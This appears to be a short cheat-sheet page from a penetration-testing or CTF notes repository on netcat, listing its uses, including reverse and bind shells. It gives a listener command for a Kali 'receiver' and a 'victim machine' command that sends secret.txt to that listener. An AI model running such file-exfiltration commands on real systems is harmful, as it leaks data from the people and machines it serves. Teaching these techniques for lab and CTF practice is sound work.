# nc

```
Description: Netcat ("Swiss Army knife" of networking) can:
    Connect to TCP or UDP ports
    Create reverse or bind shells (great for CTFs)
    Transfer files
    Listen for incoming connections (like a basic server)
    Scan ports (basic)

On Kali Linux (Receiver Machine):

nc -l -p 1234 > received.txt
```

# Victim Machine (SendBack Machine)
```
nc -w 3 192.168.0.1 1234 < secret.txt
```

## Back to README.md
[BACK](/README.md)